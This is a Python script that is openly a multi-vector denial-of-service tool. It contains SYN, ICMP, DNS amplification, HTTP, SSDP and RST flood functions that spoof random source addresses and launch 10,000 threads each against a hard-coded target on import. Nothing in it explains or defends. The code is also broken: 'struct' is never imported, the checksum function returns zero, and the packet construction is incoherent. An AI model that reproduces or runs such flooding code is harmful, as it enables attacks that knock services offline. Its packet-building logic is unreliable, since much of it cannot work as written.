import threading
import socket
import random
import time

target_ip = '192.168.1.100'
target_port = 80

def syn_flood():
    while True:
        try:
            syn_s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            udp_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            source_ip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
            
            syn_packet = (
                b'\x00\x00\x00\x00\x00\x00\x00\x00'  
                + b'\x00\x00\x00\x00\x00\x00\x00\x00'  
                + b'\x00\x00\x00\x00\x00\x00\x00\x00'  
            )
            
            ip_header = struct.pack('!4s', socket.inet_aton(source_ip))
            syn_packet = ip_header + syn_packet[4:]
            tcp_header = struct.pack('!HHLLBBHHH', random.randint(0, 65535), target_port, 0, 0, 0x2, 0, 0, 0)
            syn_packet = syn_packet[:20] + tcp_header + syn_packet[40:]
            checksum = calculate_checksum(syn_packet)
            syn_packet = syn_packet[:20] + struct.pack('!H', checksum) + syn_packet[22:]
            syn_s.sendto(syn_packet, (target_ip, 0))
            syn_s.close()
            udp_packet = b'A' * 65507  
            udp_s.bind((source_ip, 0))
            udp_s.sendto(udp_packet, (target_ip, target_port))
            udp_s.close()
            time.sleep(0.01)
        except:
            pass

def icmp_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            source_ip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
            icmp_packet = b'\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            ip_header = struct.pack('!4s', socket.inet_aton(source_ip))
            icmp_packet = ip_header + icmp_packet
            s.sendto(icmp_packet, (target_ip, 0))
            s.close()
            time.sleep(0.01)
        except:
            pass

def dns_amplification():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            source_ip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
            dns_packet = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'  
            dns_packet += b'\x06google\x03com\x00\x00\x01\x00\x01'  
            s.bind((source_ip, 0))
            s.sendto(dns_packet, (target_ip, 53))
            s.close()
            time.sleep(0.01)
        except:
            pass
        
def http_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            source_ip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
            http_request = b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n'
            s.bind((source_ip, 0))
            s.connect((target_ip, target_port))
            s.send(http_request)
            s.close()
            time.sleep(0.01)
        except:
            pass

def ssdp_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            source_ip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
            ssdp_packet = b'NOTIFY * HTTP/1.1\r\nHost: ' + target_ip.encode() + b':' + str(target_port).encode() + b'\r\n\r\n'
            s.bind((source_ip, 0))
            s.sendto(ssdp_packet, ('239.255.255.250', 1900))
            s.close()
            time.sleep(0.01)
        except:
            pass

def rst_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            source_ip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
            http_request = b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n'
            s.bind((source_ip, 0))
            s.connect((target_ip, target_port))
            s.send(http_request)
            s.recv(1024)
            s.send(b'')
            s.close()
            time.sleep(0.01)
        except:
            pass

def calculate_checksum(packet):
    return 0

def start_attack(attack_type):
    for i in range(10000):
        thread = threading.Thread(target=attack_type)
        thread.start()

start_attack(syn_flood)
start_attack(icmp_flood)
start_attack(dns_amplification)
start_attack(http_flood)
start_attack(ssdp_flood)
start_attack(rst_attack)